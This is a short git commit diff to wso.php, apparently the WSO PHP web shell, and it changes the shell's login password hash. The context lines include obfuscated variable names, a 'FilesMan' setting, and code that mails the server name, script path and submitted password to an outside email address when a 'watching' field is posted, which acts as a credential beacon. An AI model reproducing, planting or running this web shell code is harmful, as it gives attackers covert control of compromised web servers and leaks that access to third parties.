63910052aa3c04d7a91c00025d82b48d20a855d0
faithjo00 <72915395+faithjo00@users.noreply.github.com>
2020-10-29 06:17:35 +0700

    Update wso.php

--- wso.php
+++ wso.php
@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "fa769dac7a0a94ee47d8ebe021eaba9e";
+$▛ = "dbd6dbf6ce0f568777b0e45e6effe9d2"; #ajglo
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
